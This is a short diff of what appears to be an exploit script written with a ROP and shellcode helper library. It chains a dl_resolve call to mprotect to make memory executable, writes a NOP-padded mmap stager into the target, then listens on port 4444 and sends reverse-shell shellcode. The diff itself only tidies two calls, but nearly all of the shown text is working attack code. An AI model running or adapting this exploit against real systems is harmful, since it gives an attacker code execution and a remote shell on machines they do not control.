@@ -25,10 +25,9 @@ buf += rop.call_chain_ptr(
     [addr_stage, addr_stage & ~0xFFF, 0x1000, 7]
 )
 buf += rop.dl_resolve(addr_stage + len(buf), 'mprotect')
-buf += sc.nopfill('mmap_stager', 400, buf)
+buf += sc.nopfill(sc.mmap_stager(), 400, buf)
 
 p.write(buf)
 p.write_p64(0)
 with p.listen(4444, echotest=True) as (host, port):
-    buf = sc.reverse_shell(host, port)
-    p.write(buf)
+    p.write(sc.reverse_shell(host, port))
